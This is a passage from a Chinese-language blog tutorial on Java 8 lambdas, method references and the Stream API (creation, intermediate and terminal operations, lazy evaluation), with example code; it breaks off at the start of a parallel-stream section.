&#125;</span><br></pre></td></tr></table></figure><h4 id="5-lambda需要两个或以上的参数，多条执行语句，并且可以有返回值"><a href="#5-lambda需要两个或以上的参数，多条执行语句，并且可以有返回值" class="headerlink" title="5.lambda需要两个或以上的参数，多条执行语句，并且可以有返回值"></a>5.lambda需要两个或以上的参数，多条执行语句，并且可以有返回值</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test03</span><span class="params">()</span></span>&#123;</span><br><span class="line">     Comparator&lt;Integer&gt; comparator = <span class="keyword">new</span> Comparator&lt;Integer&gt;() &#123;</span><br><span class="line">         <span class="meta">@Override</span></span><br><span class="line">         <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Integer o1, Integer o2)</span> </span>&#123;</span><br><span class="line">             System.out.println(o1);</span><br><span class="line">             System.out.println(<span class="number">02</span>);</span><br><span class="line">             <span class="keyword">return</span> Integer.compare(o1,o2);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;;</span><br><span class="line">     <span class="keyword">int</span> compare = comparator.compare(<span class="number">12</span>, <span class="number">21</span>);</span><br><span class="line">     System.out.println(compare);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test04</span><span class="params">()</span></span>&#123;</span><br><span class="line">     Comparator&lt;Integer&gt; comparator = (o1,o2)-&gt; &#123; </span><br><span class="line">        System.out.println(o1);</span><br><span class="line">        System.out.println(<span class="number">02</span>);</span><br><span class="line">        <span class="keyword">return</span> Integer.compare(o1,o2);&#125;;</span><br><span class="line">    <span class="keyword">int</span> compare = comparator.compare(<span class="number">32</span>,<span class="number">23</span>);</span><br><span class="line">    System.out.println(compare);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="6-当lambda体只有一条语句时，return与大括号若有，都可以省略"><a href="#6-当lambda体只有一条语句时，return与大括号若有，都可以省略" class="headerlink" title="6.当lambda体只有一条语句时，return与大括号若有，都可以省略"></a>6.当lambda体只有一条语句时，return与大括号若有，都可以省略</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test03</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Comparator&lt;Integer&gt; comparator = <span class="keyword">new</span> Comparator&lt;Integer&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Integer o1, Integer o2)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> Integer.compare(o1,o2);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">int</span> compare = comparator.compare(<span class="number">12</span>, <span class="number">21</span>);</span><br><span class="line">        System.out.println(compare);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test04</span><span class="params">()</span></span>&#123;</span><br><span class="line">       Comparator&lt;Integer&gt; comparator = (o1,o2)-&gt; Integer.compare(o1,o2);</span><br><span class="line">       <span class="keyword">int</span> compare = comparator.compare(<span class="number">32</span>,<span class="number">23</span>);</span><br><span class="line">       System.out.println(compare);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="方法引用"><a href="#方法引用" class="headerlink" title="方法引用"></a>方法引用</h2><p>我们可以直接使用两个冒号::来调用方法</p><ul><li>静态方法引用</li><li>非静态 实例方法引用</li><li>非静态 类方法引用</li><li>构造函数方法引用</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MethodReferenceDemo</span> </span>&#123; </span><br><span class="line">   </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123; </span><br><span class="line">   </span><br><span class="line">        <span class="comment">//消费者 方法引用模式</span></span><br><span class="line"><span class="comment">// consumer();</span></span><br><span class="line">        <span class="comment">//静态方法引用</span></span><br><span class="line"><span class="comment">// callStaticMethod();</span></span><br><span class="line">        <span class="comment">//非静态 实例方法引用</span></span><br><span class="line"><span class="comment">// callMethod();</span></span><br><span class="line">        <span class="comment">//非静态 类方法引用</span></span><br><span class="line"><span class="comment">// callMethodByClass();</span></span><br><span class="line">        <span class="comment">//构造函数方法引用</span></span><br><span class="line"><span class="comment">// callConstructorMethod();</span></span><br><span class="line">        <span class="comment">//数据不变模式</span></span><br><span class="line">        callMethod2();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">consumer</span><span class="params">()</span></span>&#123; </span><br><span class="line">   </span><br><span class="line">        Consumer&lt;String&gt; consumer = System.out::println;</span><br><span class="line">        consumer.accept(<span class="string">"我是一个消费者"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">callStaticMethod</span><span class="params">()</span> </span>&#123; </span><br><span class="line">   </span><br><span class="line">        Consumer&lt;Dog&gt; consumer = Dog::bark;</span><br><span class="line">        consumer.accept(<span class="keyword">new</span> Dog());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">callMethod</span><span class="params">()</span> </span>&#123; </span><br><span class="line">   </span><br><span class="line">        Dog dog = <span class="keyword">new</span> Dog();</span><br><span class="line">        Function&lt;Integer,Integer&gt; function = dog::eat;</span><br><span class="line">        System.out.println(<span class="string">"还剩["</span> + function.apply(<span class="number">3</span>) + <span class="string">"]斤狗粮"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">callMethodByClass</span><span class="params">()</span> </span>&#123; </span><br><span class="line">   </span><br><span class="line">        BiFunction&lt;Dog,Integer,Integer&gt; biFunction  = Dog::eat;</span><br><span class="line">        System.out.println(<span class="string">"还剩["</span> + biFunction.apply(<span class="keyword">new</span> Dog(),<span class="number">4</span>) + <span class="string">"]斤狗粮"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">callConstructorMethod</span><span class="params">()</span> </span>&#123; </span><br><span class="line">   </span><br><span class="line">        Supplier&lt;Dog&gt; supplier = Dog::<span class="keyword">new</span>;</span><br><span class="line">        System.out.println(<span class="string">"new 了一个对象"</span> + supplier.get());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">callMethod2</span><span class="params">()</span> </span>&#123; </span><br><span class="line">   </span><br><span class="line">        Dog dog = <span class="keyword">new</span> Dog();</span><br><span class="line">        Function&lt;Integer,Integer&gt; function = dog::eat; <span class="comment">//函数声明</span></span><br><span class="line">        dog = <span class="keyword">null</span>;</span><br><span class="line">        System.out.println(<span class="string">"还剩["</span> + function.apply(<span class="number">3</span>) + <span class="string">"]斤狗粮"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Stream流API"><a href="#Stream流API" class="headerlink" title="Stream流API"></a>Stream流API</h2><p>Stream API是Java 8中加入的一套新的API，主要用于处理集合操作。Stream流API是函数式编程的核心所在，它以一种流式编程来对数据进行各种加工运算。形象的来说你可以把它看作工业中的流水线，将原料放入流中经过操作1、操作2…操作N输出一个产品。Stream也是如此它分为创建操作、中间操作、终止操作。业务逻辑清晰简单、代码看上去优雅不少。</p><p>流通常是由三个部分组成：</p><ol><li>数据源：流的获取，比如list.stream()方法；</li><li>中间处理：中间处理是对流元素的一系列处理。比如过滤filter，排序sorted，映射map；</li><li>终端处理：终端处理会生成结果，结果可以是任何不是流值。</li></ol><h3 id="创建操作"><a href="#创建操作" class="headerlink" title="创建操作"></a>创建操作</h3><p><img src="/img/function/streamAPI0.png" alt="Stream流创建"></p><p><img src="C:\Users\Gary Z Guo\Downloads\blog更新20230521\blog更新20230521\streamAPI0.png" alt="Stream流创建"></p><p> 在jdk8中集合数组加入了不少流的方法其中就有直接通过实例或是工具类创建流。如：list.stream()，而数据没有自身API需要借助工具类Arrays来创建。这里通过parallelStream()并行流的模式来创建就可以透明的使用到多线程了。</p><p><strong>注：通过阅读源码可以知Stream类与IntStream、LongStream并没有继承关系</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CreateStream</span> </span>&#123; </span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123; </span><br><span class="line">   </span><br><span class="line"><span class="comment">// collectionCreate();</span></span><br><span class="line"><span class="comment">// arrayCreate();</span></span><br><span class="line"><span class="comment">// numCreate();</span></span><br><span class="line">        selfCreate();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** * 集合创建 */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">collectionCreate</span><span class="params">()</span></span>&#123; </span><br><span class="line">   </span><br><span class="line">        List&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        Stream&lt;String&gt; stream = list.stream();</span><br><span class="line">        Stream&lt;String&gt; parallelStream = list.parallelStream();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** * 数组创建 */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">arrayCreate</span><span class="params">()</span></span>&#123; </span><br><span class="line">   </span><br><span class="line">        Integer[] array = <span class="keyword">new</span> Integer[<span class="number">5</span>];</span><br><span class="line">        Stream&lt;Integer&gt; stream = Arrays.stream(array);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** * 数字创建 */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">numCreate</span><span class="params">()</span></span>&#123; </span><br><span class="line">   </span><br><span class="line">        IntStream.of(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">        IntStream.rangeClosed(<span class="number">1</span>,<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">new</span> Random().ints().limit(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** * 自己创建 */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">selfCreate</span><span class="params">()</span></span>&#123; </span><br><span class="line">   </span><br><span class="line">        Random random = <span class="keyword">new</span> Random();</span><br><span class="line">        Stream.generate(random::nextInt).limit(<span class="number">20</span>);</span><br><span class="line">        Stream.iterate(<span class="number">2</span>, (x) -&gt; x*<span class="number">2</span>).limit(<span class="number">10</span>).forEach(System.out::println);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="中间操作"><a href="#中间操作" class="headerlink" title="中间操作"></a>中间操作</h3><p>中间操作分为有状态操作、无状态操作。无状态操作即该中间操作不依赖与另外的空间来存放临时结果。有状态即需要。这么说还是比较抽象，我们不妨来举个栗子0.0。</p><p>比如说：你的排序操作传统我们要进行排序是否需要依赖额外空间来进行大小的比较。去重操作需要额外空间来存放未重复的值。而像是filter只是单纯返回过滤后的结果无需额外空间。</p><p>这是一种说法，另一种说法该操作与其他操作，没有依赖关系即为无状态，反正则为有状态。这么说也没错，你看像是order操作不是就要等前面操作都执行完才可以执行吗。后面会提到一点就是Stream的操作模式实际上是每一条数据通过A操作B操作C操作来进行的，而到了中间有有状态操作是，必须停下等所有数据都操作到这一步时一起进行，否则你让他如何进行排序呢？</p><p><img src="/img/function/streamAPI1.png" alt="Stream流中间操作"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MiddleStream</span> </span>&#123; </span><br><span class="line">   </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123; </span><br><span class="line">   </span><br><span class="line"><span class="comment">// mapOrMapToXXX();</span></span><br><span class="line"><span class="comment">// flatMap();</span></span><br><span class="line"><span class="comment">// peek();</span></span><br><span class="line"><span class="comment">// distinct();</span></span><br><span class="line"><span class="comment">// sort();</span></span><br><span class="line">        limitSkip();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** * map操作 A -&gt; B * filter操作 */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">mapOrMapToXXX</span><span class="params">()</span></span>&#123; </span><br><span class="line">   </span><br><span class="line">        String s = <span class="string">"my name is 007"</span>;</span><br><span class="line">        Stream.of(s.split(<span class="string">" "</span>)).map(String::length).forEach(System.out::println);</span><br><span class="line">        System.out.println(<span class="string">"-------------"</span>);</span><br><span class="line">        Stream.of(s.split(<span class="string">" "</span>)).filter(x -&gt; x.length() &gt; <span class="number">2</span>).mapToDouble(x -&gt; x.length()).forEach(System.out::println);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** * flatMap操作 A -&gt; B list * IntStream/LongStream 并不是stream的子类需要进行装箱 */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">flatMap</span><span class="params">()</span></span>&#123; </span><br><span class="line">   </span><br><span class="line">        String s = <span class="string">"my name is 007"</span>;</span><br><span class="line">        Stream.of(s.split(<span class="string">" "</span>)).flatMap(x -&gt; x.chars().boxed()).forEach(x -&gt; System.out.println((<span class="keyword">char</span>)x.intValue()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** * peek 要类型对应 */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">peek</span><span class="params">()</span></span>&#123; </span><br><span class="line">   </span><br><span class="line">        IntStream.of(<span class="keyword">new</span> <span class="keyword">int</span>[]&#123; </span><br><span class="line">   <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;).peek(System.out::println).forEach(x-&gt;&#123; </span><br><span class="line">   &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** * distinct */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">distinct</span><span class="params">()</span></span>&#123; </span><br><span class="line">   </span><br><span class="line">        IntStream.of(<span class="keyword">new</span> <span class="keyword">int</span>[]&#123; </span><br><span class="line">   <span class="number">1</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;).distinct().forEach(System.out::println);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** * sort */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">()</span></span>&#123; </span><br><span class="line">   </span><br><span class="line">        IntStream.of(<span class="keyword">new</span> <span class="keyword">int</span>[]&#123; </span><br><span class="line">   <span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>&#125;).sorted().forEach(System.out::println);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** * limitSkip */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">limitSkip</span><span class="params">()</span></span>&#123; </span><br><span class="line">   </span><br><span class="line">        IntStream.of(<span class="keyword">new</span> <span class="keyword">int</span>[]&#123; </span><br><span class="line">   <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>&#125;).skip(<span class="number">2</span>).limit(<span class="number">2</span>).forEach(System.out::println);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>这里提到Stream有个特性叫做：惰性求值。什么意思呢？就是当stream没有调用到终止操作时，实际上是不会执行之前的所有过程的。这一点可以在demo工程中有相应的证明方法。</strong> 有接触过spark的同学可以将这一特性类比为Transformation和Action。</p><h3 id="终止操作"><a href="#终止操作" class="headerlink" title="终止操作"></a>终止操作</h3><p>终止操作即流水线的最后一个操作，往往就是返回你所要的产品。 这里分为短路操作和非短路操作：</p><p>非短路操作：从流中获取所有数据进行运算返回，有可能返回一个或多个值，但必定运用到了所有数据 短路操作：从流中截取部分数据返回。</p><p><img src="/img/function/streamAPI2.png" alt="Stream流终止操作"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FinalStream</span> </span>&#123; </span><br><span class="line">   </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123; </span><br><span class="line">   </span><br><span class="line"><span class="comment">// forEachOrdered();</span></span><br><span class="line"><span class="comment">// collect();</span></span><br><span class="line"><span class="comment">// reduce();</span></span><br><span class="line"><span class="comment">// minMixCount();</span></span><br><span class="line">        findFirst();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** * forEachOrdered */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">forEachOrdered</span><span class="params">()</span></span>&#123; </span><br><span class="line">   </span><br><span class="line">        IntStream.of(<span class="keyword">new</span> <span class="keyword">int</span>[]&#123; </span><br><span class="line">   <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>&#125;).parallel().forEach(System.out::println);</span><br><span class="line"><span class="comment">// IntStream.of(new int[]&#123;1,2,3,4,5,6,7&#125;).parallel().forEachOrdered(System.out::println);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** * collect、toArray */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">collect</span><span class="params">()</span></span>&#123; </span><br><span class="line">   </span><br><span class="line">        String s = <span class="string">"hello world!"</span>;</span><br><span class="line">        List&lt;String&gt; collect = Stream.of(s.split(<span class="string">" "</span>)).collect(Collectors.toList());</span><br><span class="line">        System.out.println(collect);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** * reduce */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">reduce</span><span class="params">()</span></span>&#123; </span><br><span class="line">   </span><br><span class="line">        Integer[] intArr = <span class="keyword">new</span> Integer[]&#123; </span><br><span class="line">   <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>&#125;;</span><br><span class="line">        Optional&lt;Integer&gt; optional = Stream.of(intArr).reduce((x, y) -&gt; x + y);</span><br><span class="line">        System.out.println(optional.get());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** * minMixCount */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">minMixCount</span><span class="params">()</span></span>&#123; </span><br><span class="line">   </span><br><span class="line">        Integer[] intArr = <span class="keyword">new</span> Integer[]&#123; </span><br><span class="line">   <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>&#125;;</span><br><span class="line">        Optional&lt;Integer&gt; optional = Stream.of(intArr).max(Comparator.comparingInt(x -&gt; x));</span><br><span class="line">        System.out.println(optional.get());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//短路操作--------------------------------</span></span><br><span class="line">    <span class="comment">/** * findFirst */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">findFirst</span><span class="params">()</span></span>&#123; </span><br><span class="line">   </span><br><span class="line">        Optional&lt;Integer&gt; first = Stream.generate(() -&gt; <span class="keyword">new</span> Random().nextInt()).findFirst();</span><br><span class="line">        System.out.println(first.get());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="并行流"><a href="#并行流" class="headerlink" title="并行流"></a>并行流</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ParallelStream</span> </span>&#123; </span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123; </span><br><span class="line">   </span><br><span class="line"><span class="comment">// createParallelStream();</span></span><br><span class="line"><span class="comment">// feature2();</span></span><br><span class="line"><span class="comment">// feature3();</span></span><br><span class="line">        feature4();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** * 特性一 并行流线程数 * 并行流线程数默认为cpu个数 * 